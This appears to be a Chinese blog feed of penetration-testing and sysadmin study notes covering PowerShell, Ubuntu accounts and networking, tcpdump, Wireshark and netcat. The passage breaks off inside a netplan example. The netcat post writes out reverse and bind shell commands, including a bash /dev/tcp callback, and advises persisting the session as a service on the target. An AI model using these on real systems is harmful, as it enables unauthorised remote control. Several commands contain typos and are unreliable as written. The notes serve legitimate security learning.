Set-Alias notepad++ "C:\Development Kit\Notepad++\notepad++.exe" # 导出别名 export-alias demp.ps1 # 导入别名 import-alias -force demo.ps1 Powershell变量变量基础 #定义变量 $name="hhh" #打印 直接$name # Note: 大小写不敏感，所以特殊变量尽量用花括号 ${"i am a boy"}="ggggg" # 可以直接运算 $n=(2+8*10)/2 # 多个变量同时值 $n1=$n2=1 $m, $n=1, 2 #调换变量值 $n1, $n2=$n2, $n1 变量操作 # 查看变量是否存在 test-path test-path variable:$n1 # 删除变量 del variable:$n1 remove-variable ## powershell提供了五个专门管理变量的命令 Clear-Variable Get-Variable New-Variable Remove-Variable Set-Variable ### 变量写保护（只读） #1.设置 $server = '10.10.10.10' Set-Variable server -option Readonly #2.新建时 New-Variable nu1 -Value 100 -Force -Option readonly #上面的变量不能更改，但是可以通过删除变量(del Variable:num -Force)，再重新创建变量更新变量内容。 # 选项Constant，常量一旦声明，不可修改 new-variable num -Value "strong" -Option constant 自动化变量1.用户信息：例如用户的根目录$home2.配置信息:例如powershell控制台的大小，颜色，背景等。3.运行时信息：例如一个函数由谁调用，一个脚本运行的目录等。 # 比如：终端一打开就自动加载的变量 # 用户根目录 $home # 跟linux下基本一样 $$ #包含会话所收到的最后一行中的最后一个令牌。 $^ #包含会话所收到的最后一行中的第一个令牌。 $? #上一个命令的返回值 $_ #包含管道对象中的当前对象 $pid #进程id $null $Host $LastExitCode #包含运行的最后一个基于 Windows 的程序的退出代码。 参考：这里 环境变量 #查看环境变量 ls env ls env:name #查看具体环境变量的值 $env:windir # 新建用户环境变量(临时) $env:name="xxx" # 新建环境变量(长久) xxx # 在环境变量的PATH下添加一条内容 $Env:path=$Env:Path+";C:\Go\bin" # .net方式只对用户变量生效 [environment]::setenvironment("PATH","D:\","User") # .net获取值 [environment]::getenvironment("PATH","User") # 删除环境变量 del env:name #或 remove-item env:name 在其他脚本中使用powershell#比如bat @echo off powershell "&amp;'c:\Users\test\e.psl'" Powershell条件判断条件操作符-eq 等于 -ne 不等与 -gt 大于 -lt 小于 -le 小于等于 -contains #布尔 -not 取反 -ant -or -xor # 比如： 80 -eq 70 1gb -gt lmb (1,2,3) -contains 2 if语句写脚本编辑器ISE里面了 $num=56 if($num -gt 50 -and $num -lt 60) { "大于50且小于60" } elseif($num -eq 50) { "等于50" } else { "小于50" } switch语句$num=45 switch($num) { {($_ -lt 50) -and ($_ -gt 40)} {"小于50且大于40"} 50 {"等于50"} {$_ -gt 50} {"大于50"} } Powershell循环结构foreach语句$arr=1..10 foreach ($n in $arr) { if($n -gt 5) { $n } } 打印路径中大小大于多少的文件 $pat_val=dir D:\antSword foreach ($file in $pat_val) { if($file.length -gt 1kb) { $file.name } } while语句while $num=15 while($num -ge 10) { $num $num -- } do … while(先运行一次) $num=15 do { $num $num -- }while($num -ge 10) continue与breakbreak $num=1 while($num -le 10) { if($num -eq 4) { break }else { $num } $num++ } continue $num=1 while($num -lt 10) { if($num -eq 4) { $num++ continue }else { $num $num++ } } for语句$num=0 for($i=1; $i -le 100; $i++) { $sum+=$i $sum } switch实现循环$num=1..10 switch($num) { {($_ % 2) -eq 0}{"此数值是偶数：$_"} {($_ % 2) -ne 0}{"此数值是奇数：$_"} default{"num=$_"} } Powershell数组数组的创建# 1. $arr=1,2,3,4 # 2. $arr=1..5 # 3.可以支持不同类型的值 $arr=1,"hhh",(get-date) # 4.空数组 $arr=@() # 5.有个逗号就行 $arr=,1 # 6. 命令执行结果的每一行作为一个数组元素 $arr=ipconfig #判断是否为数组 $arr -is [array] 访问数组$arr[0] $arr[-1] $arr[0..2] # 取出0,1,2 $arr.Count # 元素个数 $arr[($arr.Count)..0] # 倒序 $arr+="haha" # 增加元素 Powershell函数自定义函数及调用function test { ping www.xpshuai.cn. } test # 调用 传参 function test($site) { ping $site } test www.xpshuai.cn # 调用 # 多个参数 test p1 p2 函数返回值function add($n1, $n2) { $c=$n1,$n2 $sum=$n1+$n2; $sum.gettype().fullname # 数据类型 if($sum.gettype().fullname -eq "System.Double") { "c为数组，索引取值: $c[0]" return $n1,$n2,$sum,"double浮点数" } return $n1,$n2,$sum } add 1 2.5 # 调用 Powershell定义文本powershell中转义符是反引号 "hello先执行命令: $(Get-Date)" "hello表达式: $(5*6)" "单双引号hello, my name is '哈哈'" "都用双引号，用反引号转义：hello, my name is `"哈哈`"" # 换行符:`n 回车: `r "你好啊 `n 朋友 `n 我换行啦" Powershell实现用户交互read-host $input=read-host "请输入用户名" "您好，你输入从用户名为: $input" Powershell格式化字符串# 格式化之前 $name="lili" $age=20 $gender="girl" "My name is $name, i am $age years old, and i am a $gender" # 格式化 -f $name="lili" $age=20 $gender="girl" "My name is {0}, i am {1} years old, and i am a {2}, {3}." -f $name,$age,$gender,$(3*6) #运算的话，尽量用小括号括起来 String对象方法对字符串的操作 $str="D:\Desktop\Cobalt strike4\test\a.txt" $str.Split(".")[-1] # 以.点分割，然后取最后一位 $str.endswith("ll") # 是否以ll结尾 $str.Contains("txt") # 是否包含某个字符串 $str.CompareTo("D:\Desktop\Cobalt strike4\test\a.txt") # 判断两个字符串是否相等 $str.IndexOf("w") # 找出w的索引位置 $str.Insert(3,"hhh") # 在索引3地方插入hhh $str.Replace("c","C") # 替换 $str.Remove(0) # 删除 Powershell操作注册表#切换到根键 cd hkcu: cd .. exit # 切换到别的根键 cd HKLM: # 获取 get-ItemProperty # 设置 set-ItemProperty # 移除 remove-ItemProperty # 等等其他 命令 描述 Dir, Get-ChildItem 列出键的内容 Cd, Set-Location 更改当前（键）目录 HKCU:, HKLM: 预定义的两个重要注册表根目录虚拟驱动器 Get-ItemProperty 读取键的值 Set-ItemProperty 设置键的值 New-ItemProperty 给键创建一个新值 Clear-ItemProperty 删除键的值内容 Remove-ItemProperty 删除键的值 New-Item, md 创建一个新键 Remove-Item, Del 删除一个键 Test-Path 验证键是否存在 Powershell文件操作# 新建目录 New-Item xxxx -type directory # 或者 md test # 新建文件 New-Item xxxx.txt -type File # 删除目录 Remove-Item test # 显示文本内容 Get-Content test.txt # 设置文本内容 Set-Content .\test.txt -Value "哈哈哈哈哈哈哈" # 追加内容 Add-Content .\test.txt -Value "嘻嘻嘻嘻嘻嘻嘻嘻" # 清除内容 Clear-Content .\test.txt 常用的PowerShell攻击工具： PowerSploit NiShang Empire (基于PowerShell的远控木马) PowerCat (PowerShell版的NetCat) 其他技巧… … document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>PowerShell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-账号管理]]></title>
    <url>%2Fposts%2F19367%2F</url>
    <content type="text"><![CDATA[​ 用户账号管理基础用户账号管理 为新员工创建账号 修改账号密码策略 禁用休假员工账号 删除离职员工账号(一般先禁用, 如果要删除, 注意提前把重要文件备份) 设置账号访问权限(只赋予其工作必需的权限) 每个人保管自己的密码 不要将密码泄露给任何人 保证密码复杂度 不要将密码写在纸条贴在限制器上 关于Linux账号管理基础知识Root账号 能做任何事情（甚至删除操作系统自身） 大部分Linux发行版安装时要求设置root账号密码 而Ubuntu默认禁用Root账号 可sudo或临时切换为root账号 可手动启用root账号 平时以普通员工账号管理计算机 在Ubuntu中执行sudo rm -rf /后，有提示 安装过程中创建管理员个人账号： 作为日常管理使用 创建账号 # 本机用户账号存储文件: `/etc/passwd` # 冒号分隔：第二列是占位符(x来代替密码，此文件不存储密码,在shadow中)，第三四列（uid,组id）root的id是0，第五列是用户描述，第六列是主目录,最后一列是终端类型 # 逗号分隔的部分： # 创建用户（useradd） 建议添加-m参数 useradd user01 -m # 一般是这样使用多 useradd user01 -m -d /home/user01 # -d自定义主目录位置，父目录必须是存在 # 如果只是sudo useradd user01 #是没有用户家目录的，且该用户的终端为sh # 新添加的账号的uid是递增的（系统会自动创建一个和uid相同的组id组账号） # 参数： -d # 账号主目录（复制于/etc/skel） -m # 同时创建主目录（默认首次登录时创建主目录） 用户主目录内容拷贝自`/etc/skel` -c # 全名（描述,即/etc/passwd中第五列那个） -e # 账号过期（YYYY-MM-DD） -- 适合临时工作的人 -N # 不创建同名组账号(gid会默认设置为100) useradd user01 -m -N -g # 指定主组（必须已经存在） useradd user01 -m -g sudo -G # 额外组 # Note: 账号名最长32个字符（不要以数字或其他特殊字符开头） # 给用户设置密码 sudo passwd user02 账号数据库1./etc/passwd格式：用户名:密码占位符:UID:GID:全名(描述),房间号,公司电话,家庭电话,others:主目录:shell 2./etc/shadow存放密码等其他相关信息, 默认root才能查看与读写格式：用户名:密码:上次修改时间:密码最小使用期限:密码最长使用期:'密码'过期前几天提醒:密码过期几天后账号会被锁定:'账号'过期日(距离1970-01-01的天数):保留 密码位置为!、*的账号不能直接登陆系统(其他账号登录可切换为其账号) , !表示密码被锁定 上次修改时间：自从1970-01-01起的天数，如果为0表示用户下次登陆需要修改密码，空表示关闭密码过期功能(不会被锁定) 密码最长使用期限&lt;密码最小使用期 时候，用户无法更改密码(一般会设置密码有效期为90天) 密码过期几天后账号会被锁定： 账号过期用户不能登录 密码过期看是否锁定账号 账户修改：建议多登陆几个会话备用，防止手滑出现问题导致登不上去 设置账号密码 passwd user01 # 参数： -l # 锁定账户密码 sudo passwd -l user01 -u # 解锁账号 sudo passwd -u user01 -d # 删除密码（账号无密码可登录） -n/-x # 密码最小 / 最大 使用期限 -w # 密码过期前几天发警告 -i # 密码过期后锁账号 -e # 密码立刻过期（下次登录必须修改密码） -s # 查看账号的密码状态(L 锁定, P有密码,NP没密码 ) passwd -aS # 查看账号密码状态（同上） passwd -a -S 添加账号adduser 参数少，更简洁 adduser user02 # 基于useradd的perl脚本 # 并非所有Linux发行版中都包含 # 向导方式运行（不需记忆命令参数） # 位置： /usr/sbin/adduser # 另一个批量添加账号 newusers sudo newusers users.txt # 文件内容按passwd格式填写: user05:pass15:::hahaha:/home/user15:/bin/bash 删除账号userdel或deluser sudo userdel user02 # 不会删除主目录 userdel -r user02 # 删除账号同时删除主目录（一般先禁用几个月等到不需要一下文件时候再删除但是要提前备份） userdel -f user02 # 强制删除文件 rm -rf /home/user02 # 删除用户主目录 切换账号 # 切换到root账号 su # 需要输入root密码（默认root没密码,先给root设密码[sudo passwd root]再操作） sudo su # 输入当前账号密码(是输入的当前账号的密码) sudo -i # 同上（root前面的命令提示符是井号） exit退出到自己的回话 sudo -s # 同上 # 切换到其他账号 su user01 # 切换到其他账号（输入的user01的密码） sudo su user01 #切换到其他账号（输入的是当前用户的密码） 组账号管理 分组归类统一管理 将用户账号分组管理和指派权限 用户创建同时生成同名的组账号 每个文件有唯一的所属账号和所属组（属主、数组） 每个用户可以同属属于多个组，但只有一个主组 查看当前用户所属的组： groups cat /etc/groups格式： 组名:密码(通常不使用):GID:逗号分隔的'成员'用户账号 组管理 sudo groupadd g_name # 添加组 sudo groupdel g_name # 删除组 gpasswd -a u_name g_name # 将用户加入'额外组' gpasswd -d u_name g_name # 将用户从组中删除 usermod -aG g_name user # 将用户加入'额外组' a是添加,G是组 # -a 附件（否则替换） usermod -g g_name user # 修改用户的'主组' -g 把user01的主组改为IT: sudo usermod -g IT user01 usermod -d /home/user2 user2 -m # 将某用户主目录内容移动到当前目录 usermod -l user2 user1 # 将用户user1修改为user2(只是名称换了，其他的权限和id都不变) # 等等其他参数...... 密码策略使用足够复杂的密码Pluggable Authentication Module(PAM) # 安装pam apt install libpam-cracklib # vim /etc/pam.d/common-password 增加配置 password required pam_pwhistory.so.remember=9 use_authok # 最近几次的密码不能相同 权限每个文件和文件夹拥有唯一的属主和属组（ls -l） 权限类型： r, w, x 读，写，执行 4, 2, 1 （这个数字是二进制转换来的，假设数组的权限为r–,对应二进制为100,转为十进制为4，其他类似） u，g，o 属主，属组，其他 # 除了第一位，后面每三位一组（所有者u，所有组g，其他用户o） -rwxrwxrwx # 权限 文件 文件夹 # R 读取文件内容，拷贝 列出目录内容 # W 更改文件内容 创建、删除文件及文件夹 # X 作为应用程序执行文件 cd进入；读取文件属性和权限 权限修改命令：chmod ## 只有其属主和root可以修改权限 ## 对文件 # + - 方式 chmod u+x a.txt chmod u-r a.txt chmod g-x a.txt chmod o+r a.txt # 数字方式 chmod 777 b.txt chmod 764 b.txt ## 对目录(一般都给x权限，不然cd不进去) chmod u+x code/ chmod u-wx code/ # 对目录：r只能看到里面的文件，要写看到属性，得加x权限 # 父级目录的权限/子文件的权限 # 递归修改权限 chmod 770 -R code/ ## 权限与搜索 find . -perm 770 # 搜索权限为770的文件 # -type f 只搜文件； -type d 只搜目录 find /path/dir/ -type f perm 664 -user xps -group xps # 属于xps组，属于xps用户，权限为664的文件 find /path/dir/ -type f perm 755 -user xps -exec ls -l {}\; # 搜索完之后执行命令 find /path/dir/ -type f perm 755 -user xps -exec chmod 770 {}\; # 搜索完之后再进行权限修改 # 如果用户删了，并且该用户有文件没删除干净，下面找到没有所属用户的文件或文件夹 find /home -nouser -exec rm -rf {}\; # 查找无有效属主对象，然后删除 属主与属组修改属主和属组 # chown需要sudo sudo chown user01 a.txt # 修改a.txt的所有者为user01 sudo chown -R user01 /code # 递归修改目录的所有者 # 修改所有组为user01 sudo chgrp user01 a.txt # 所有者和所有组都修改 chown user01:user01 a.txt 特殊权限 Setuid(4)主要针对可执行程序一旦设置了suid之后：任何用户执行程序时都具备使用属主的权限设置：chmod u+s a.sh或chmod 4777 /bin/cat (前面三个二进制, 二进制为100,即4；第二种数值方式对链接不生效)比如使用passwd修改自己密码的时候修改的是shadow文件(他的属主是root)，它就是设置了s权限 如果不太懂，尽量不要随便设置suid，否则后患无穷 Setgid(2)主要针对可执行程序和目录对于程序一旦设置了sgid：任何用户执行程序时都具备使用属组的权限应用于目录时：可实现共享文件访问效果(新建文件的数组集成目录属组): 一个用户再在里面新建文件之后，一个组里的用户就都可以共享设置：chmod g+s code/或sudo chmod 2775 /bin/cat设置完之后，数组位置权限就多了s权限 stick bit(1)针对目录的受限删除位（root、属主可以删）典型例子：/tmp目录设置： chmod o+t code/加了stick位(其他用户的位置)，自己创建的文件只有自己能删除，别人无法删除 权限管理掩码决定文件和目录的默认权限 - 文件默认权限：`666`-掩码（如果掩码为002, 6-2=4，权限就为664） - 文件夹默认权限：`777`-掩码（如果掩码为002, 7-2=5，权限就为775） 命令：umask查看当前掩码修改掩码命令：umask 007（临时性的）长久修改：配置文件vi /etc/login.defs # 配置其中umask UMASK 022 # 属主的掩码0，数组的掩码2，其他用户的掩码2 USERGROUPS_ENAB yes # 改为yes，属主的掩码来覆盖数组的掩码 # 要想使得真正的权限与umask设置的一致： F1.可以把上面的改为no F2.设置用户账号名称和组账号名称不一样，让用户id和组id也不一样（推荐这种方式修改） sudo usermod -g users user01 # 把用户的主组改为users umask 002 用户名与组名相同、UID与GID相同 umask 027 通常设置027就行 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ubuntu</tag>
        <tag>账号管理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[工具 - tcpdump使用&过程文档记录]]></title>
    <url>%2Fposts%2F13625%2F</url>
    <content type="text"><![CDATA[工具-tcpdump使用 No_GUI的抓包分析工具 Linux、Unix系统默认安装 抓包默认只抓68个字节 #参数: -i网卡 -s 抓包大小 -w保存到文件 tcpdump -i ens33 -s 0 -w file.pcap #抓取指定端口的流量 tcpdump -i ens33 port 22 读取抓包文件#查看保存到文件中的数据包 tcpdump -r file.pcap #参数： -A 以ascii码形式显示内容 tcpdump -A -r file.pcap #参数： -X 以16进制形式显示内容 tcpdump -X -r file.pcap 显示筛选器#利用OS自带的管道 #参数： -n 以ip地址显示，不显示域名； 显示第三列(ip+端口)并去重 tcpdump -n -r file.pcap | awk '{print $3}' | sort -u #tcpdump自身的显示筛选： 只显示源地址为这个的 tcpdump -n -src host 192.168.0.1 -r file.pcap #只显示目的地址为这个的 tcpdump -n -dst host 192.168.0.130 -r file.pcap #按端口号筛选 tcpdump -n port 53 -r file.pcap #显示udp的53端口 tcpdump -n udp port 53 -r file.pcap #显示tcp的 tcpdump -n tcp port 80 -r file.pcap #显示icmp的 tcpdump -n icmp -r file.pcap #显示ip的 tcpdump -n ip -r file.pcap #-X以16进制显示 tcpdump -nX port 80 -r file.pcap 高级筛选TCP的包头：可以看到上图中Flag中的标志位tcpdump可以对如此细致的东西进行筛选 #只显示第13号字节中值转换为10进制为24(push+ack)的数据包 tcpdump -A -n 'tcp[13]24' -r file.cap PS: nc、Wireshark、tcpdump必须非常熟练地掌握 过程文档记录工具 介绍几个kali中自带的 1.Dradis基于web的工具 短期临时小团队资源共享 各种插件导入文件（兼容很多种扫描器日志的导入） 使用：webapp初始化后，输入密码即可登录导入导出(支持不同文件格式)扫描器日志（具体自己操作一下就知道了） 2.Keepnote层级化记录信息：不同项目可以使用不同文件夹，子文件可以导出 3.Truecrypt一款加密工具2014年停止更新（官方原因是安全性不够，但实际使用却依然较安全） 选择加密区域：1.创建加密文件（create volume）2.创建卷(全盘加密) 选择加密方式1.标准加密卷：2.隐藏加密卷： 若被人强迫输入加密密码，可以输入一个密码打开后什么都没有(outer volume), 而重要信息存在一块隐藏空间(hidden volume)里面。hidden volume大小不能超过outer volume。【首先指定外部卷(迷惑别人的)的大小(尽量大一些,包括内部卷的大小)和密码, 内部机密卷存在于外部卷的空间中(设置它的大小和密码)】 选择加密算法（也可以多种加密算法叠加用）设置密码指定卷格式生成随机key(用鼠标再屏幕上乱滑,划得月乱，key越复杂) 使用：选择挂载的文件，就像挂载一块硬盘分区一样使用完成后：dismount或dismount all就行 对于隐藏加密卷: 输入外部卷的密码就是外部卷的内容(存储大小也隐藏了另一部分)，输入内部卷的密码打开的就是内部卷的内容 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>tcpdump</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[工具 - Wireshark使用]]></title>
    <url>%2Fposts%2F56492%2F</url>
    <content type="text"><![CDATA[Wireshark简介 抓包嗅探协议分析 安全专家必备技能 抓包引擎(wireshark本身是分析数据包, 抓包靠下面两个引擎) Linux上： Libpcap Windows上： Winpcap 解码能力（衡量抓包软件好坏的重要标准） 基本使用方法启动捕获-&gt;选项-&gt; … …选择抓包网卡 混杂模式勾选上之后，如果数据包不是发送给我指定这个网卡的，也会被抓取 抓包筛选器指定抓什么包，不抓什么包 实时抓包就是主界面 保存和分析捕获文件先停止，再保存(可以选择格式, 尽量使用.pcap格式)，压缩等, 下次可以导入已经抓取的数据包文件 首选项编辑-&gt;首选项 -&gt; 可以自己根据需要修改和定制界面布局 筛选器 过滤干扰的数据包 抓包筛选器(捕获, 选项里面那个) 显示筛选器(主界面那个, 更多使用) – 常用语法 可以单独选择，也可以叠加(and, or)上面的条件进行筛选： 常见协议数据包数据包的分层结构显示 ARP IPProtocol字段： 表示上层是： udp–&gt; 17， tcp–&gt; 6, icmp –&gt;2, igmp –&gt;2四层有好多中协议对应不同的数字Header checksum字段：校验和, 每两位进行异或tcp和udp一般不会有option字段（视情况而定） TCP 附：三次握手 四次挥手 UDP udp和tcp的类似，自己实践能看懂udp开销更小 DNS 应用层协议，基于udp HTTP ftp 这里没ftp服务器就先不放图了ftp也是一个应用层协议 wishark默认是用端口区分协议(假设我们手动把http不开在80端口，wireshark分不清非标准端口的, 需要我们手动修改.如下图.) 数据流比如访问一个网页, 往往产生很多数据包wireshark提供了数据流 http smtp pop3 ssl 等 操作(以http为例)：按照上图操作完后，会来到数据流的界面，如下： 信息统计1.查看导入数据包文件摘要信息导入数据包文件，打开“统计”-&gt;“文件属性”：可以看到一些摘要性的信息 2.节点数打开“统计”-&gt;“endpoint”： 可以以ip地址区分/udp有多少/二层的包头/其他标准区分 节点的个数等Tx表示发送, Rx表示接收的数据包 3.协议分布打开“统计”-&gt;“协议分级”：可以看到每个协议里面什么协议的占用百分比(DNS流量占用一般都很小,否则很有可能出现异常) 4.包大小分布打开“统计”-&gt;“分组长度”：可以看到大包多还是小包多 5.会话连接打开“统计”-&gt;“conversations”：可以看到哪两台机器之间数据包会话传送最多啥的 6.解码方式对于非默认端口的数据包，wiresharl只会按端口区分的右键, 手动decode为指定的协议， 这样wireshark就会按正确的协议来解析 需要熟悉不同协议数据包的内容, 防止手动解析错误 7.专家系统“分析” -&gt; “专家系统”: 可能自动给我们一些提示 思路：如果很多个数据包，先从统计信息入手，分析出重点，找出方向。然后筛选出来，逐步分析包的内容 实践 抓包对比nc、ncta加密与不加密的流量 企业抓包部署方案 (Wiershark也有不足，大型网络还是需要商业化的软件) Sniffer Cace / riverbed （大部分还是基于wireshark进行了二次开发，改名了应该, 如果需要去网上找吧） Cascad pilot document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>Wireshark</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[工具 - netcat使用]]></title>
    <url>%2Fposts%2F13625%2F</url>
    <content type="text"><![CDATA[netcat使用简介 侦听模式/传输模式 可以替代telent / 获取banner信息 传输文本信息 传输文件/目录 加密传输文件 远程控制/木马 加密所有流量 流媒体服务器 远程克隆硬盘 基本用法1. 实现telnet / banner# 题外话:追踪路由 mtr 114.114.114.114 ## nc作为客户端： # 参数 -v 显示详细信息 # 参数 -n 如果是域名,不进行域名解析(建议直接跟ip地址) nc -nv 1.1.1.1 110 # 连接pop3服务器，可以看到banner信息（可以进行user登录[base64编码],输入指令） nc -nv 1.1.1.1 25 # smtp服务器 nc -nv 1.1.1.1 80 # 探测80端口(都可进行交互的命令) 2.传输文本信息# 可以做聊天用 # 一台作为服务端 -l 监听, -p 端口 nc -l -p 4444 # 另一台作为客户端去连接服务端 nc -nv 1.1.1.1 4444 用途：远程电子取证 (原则:尽可能少修改被审计系统的状态，避免影响证据)就可以用nc来操作:我的电脑: nc -l -p 3333 监听被审计系统:ls -l | nc -nv 1.1.1.1 3333 输出到我的电脑 我的电脑: nc -l -p 3333 &gt; ps.txt 输出结果重定向到文件被审计系统:ps -ef | nc -nv 1.1.1.1 3333 -q 1 参数-q: 输出完成之后过1秒就断开 题外话：lsof 查看已经打开的文件 3.传输文件/目录传输文件# 客户端向服务端传输 （正向） A： nc-lp 3333 > 1.mp4 B: nc -nv 1.1.1.1 3333 &lt; 1.mp4 -q 1 # 或者, 服务端向客户端传输文件 （反向） A: nc -q 1 -lp 3333 &lt; a.mp4 B: nc -nv 1.1.1.1 3333 > 2.mp4 传输目录# 正向(服务端先打包再传给客户端,注意小横线别遗漏) A: tar -cvf - music/ | nc -lp 3333 -q 1 B: nc -nv 1.1.1.1 3333 | tar -xvf - # 先接收再解包 加密传文件A： nc -lp 3333 | mcrypt --flush -Fbqd -a rijndael-256-m ecb > 1.mp4 # 接收，解密 B： mcrypt --fulsh -Fbq -a rijndael-256-m ecb &lt; a.mp4 | nc 1.1.1.1 3333 -q 1 # 加密，传送 # 需要输入加密秘钥，解密秘钥 # 不是nc的加密功能，是操作系统的加密命令，可以自行安装 4.流媒体#把视频流输出到B端 A: cat 1.mp4 | nc -lp 3333 B: nc -nv 1.1.1.1 3333 | mplayer -vo x11 -cache 3000 - #接收视频流，输出给指定播放器和缓存进行播放 5.端口扫描 以客户端角色`bash #并非擅长端口扫描 #参数 -z 扫描参数，只判断是否开放（默认tcp）nc -nvz 1.1.1.1 1-65535 #参数 -u 扫描udp服务的端口 （不太准确）nc -nvzu 1.1.1.1 1-1024 #### &lt;font color=red&gt;6.远程克隆硬盘&lt;/font&gt; **远程电子取证**，可以将目标服务器硬盘远程复制(`块`级别的备份,`磁盘磁道的状态原原本本的复制`)，或者内存(内存中运行的病毒进程) ```bash A: nc -lp 3333 | dd of=/dev/sda B: dd -if=/dev/sda | nc -nv 1.1.1.1 3333 -q 1 7.远程控制参数: -c正向： 目标机器作为服务端监听, 把bash传给我 A: nc -lp 3333 -c bash #目标机器 B: nc 1.1.1.1 3333 反向： 我的机器作为服务端, 让目标机器作为客户端主动连接我(客户端把bash传给服务器端) A: nc -lvp 3333 B: nc 1.1.1.1 3333 -c bash #目标机器 #假如nc不支持-c 或者 -e 参数（openbsd netcat）,我们仍然能够创建远程shell 目标机器： bash -i >&amp; /dev/tcp/192.168.41.133/2223 0>&amp;1 攻击方： nc -lvvp 2223 Note: Windows用户把bash改为cmd 反向连接用的多， 因为好多都限制进入的流量而不太多限制出去的流量(根据他允许的端口调整,比如dns) 长久维持会话： 写成脚本作为系统服务，让目标机器已启动就连接我 ncat 命令 nc缺陷： nc缺乏加密能力：是数据是明文传输（容易被别人嗅探） 缺乏身份验证能力：端口如果一直向外开放，容易被他人连接窃取当做肉鸡 不同系统/平台的nc参数功能不尽相同（自己 -h 查看帮助文档和测试） ncat 命令是包含在nmap工具包中里面的一个东西(弥补了nc缺乏加密和身份验证的不足) 正向连接： #先进行了秘钥交换和加密 #被控端(服务器端) -allow允许连接的ip， 端口, ssl加密 A: ncat -c bash -allow 192.168.1.20 -vnl 3333 --ssl B: ncat -nv 192.168.1.19 3333 --ssl #攻击端 其他… … document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>nc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-网络相关知识]]></title>
    <url>%2Fposts%2F9091%2F</url>
    <content type="text"><![CDATA[网络原理 ping 127.0.0.1 如果能通，说明本机的TCP/IP协议已经配置成功啦arping 网卡配置网卡接口-enp2s0 (最近使用)、eth0 （以前这么使用） #wl 开头的是无线网卡 # ifconfig 命令 # 查看所有网卡 ifconfig -a 字段意义：MTU,发包，收包，`collisions`发生多少次冲突 # ip 命令 ip link # 查看所有网卡和信息 ip address # lshw 查看系统硬件命令 # 只查看网卡的命令 sudo lshw -class network 管理网卡# 查看网卡参数 sud ethtool enp0s3 # -s 配置 ： speed 速度 半双工 sud ethtool -s duplex half | full speed 1000 网络基本设置## 临时设置IP地址 sudo ifconfig eth0 10.0.0.00 netmask 255.255.255.0 # 24位掩码 sudo ifconfig eth0 10.0.0.100/24 # 设置网关 gw sudo route add default gw 10.0.0.1 eth0 # 网段路由 add-net （静态路由：去哪个网段，应该怎么转发） sudo route add-net 0.0.0.0 netmask 0.0.0.0 gw 1.1.1.1 # 主机路由 add-host sudo route add-host 2.2.2.2 gw 1.1.1.1 # 清除网卡配置 ip addr fulsh eth0 # 向网络中要一个IP sudo dhcpclient # 禁用网卡 sudo ifconfig eth0 down # 启用网卡 sudo ifconfig eth0 up # 重启网络服务 sudo systemctrl restart networking.service 网卡配置文件/etc/network/interfaces 文件字段： iface 网卡name inet 网络配置（loopback/dhcp/static） sudo eth0 iface eth0 inet static|DHCP # pre-up 系统启动中(网卡运行前) 设置为1000M，全双工 pre-up/sbin/ethtool -s eth0 speed 1000 duplex full 动态获取IP地址# sudo vim /etc/network/interfaces auto eth0 iface inet dhcp 静态IP地址一般服务器是静态的IP # sudo vim /etc/network/interfaces auto eth0 iface inet static address 192.168.123.9 netmask 255.255.255.0 # 掩码 gateway 192.168.123.1 # 网关 dns-nameservers 192.168.123.1 202.99.96.68 # 一般dns地址写俩 # 上面是基本配置, 下面是额外其他配置项 broadcast 192.168.123.255 # 网段的广播地址 # dns-search abc.com # 如果属于某个dns域,就默认去找这个 up route add -net 172.16.0.0/24 gw 192.168.23.1 eth0 # 开机之后,添加一个网段(要指定具体网关) mtu 1460 # 指定MTU 字节 # hwaddress 00:11:22:33:44:55 # 指定硬件mac地址 # 刷新,重启网络, 配置文件的网络生效(实在不行就重启计算机) sudo ip address fulsh eth0 sudo systemctrl restart networking.service 指定路由清除信息ip addr flush ens32 Note： VmWare对网络的支持要好于VirtualBox(比如有些网络的配置可能有限制) Ubuntu 1804配置静态ipubuntu18.04 server，启用了新的网络工具netplan，对于命令行配置网络参数跟之前的版本有比较大的差别，现在介绍如下： 其网络配置文件是放在/etc/netplan/50-cloud-init.yaml, 缺省是用dhcp方式，如果要配置静态地址，则需要修改此文件的想关内容，见如下的例子： network: version: 2 